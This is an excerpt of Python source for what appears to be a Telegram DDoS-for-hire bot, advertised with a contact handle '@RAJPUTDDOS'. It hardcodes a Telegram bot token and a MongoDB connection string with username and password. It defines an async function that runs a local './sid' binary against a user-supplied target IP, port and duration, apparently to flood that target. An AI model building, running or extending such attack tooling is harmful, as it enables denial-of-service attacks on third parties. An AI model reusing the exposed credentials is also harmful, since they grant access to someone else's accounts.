...
TOKEN = '7655786078:AAHYocIn3_vOC-dELlfWxqtcdPPkhJvEeAo'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002384964365
CHANNEL_ID = -1002384964365
error_channel_id = -1002384964365
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sid {target_ip} {target_port} {duration} 900")
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @RAJPUTDDOS* "  # Contact owner message
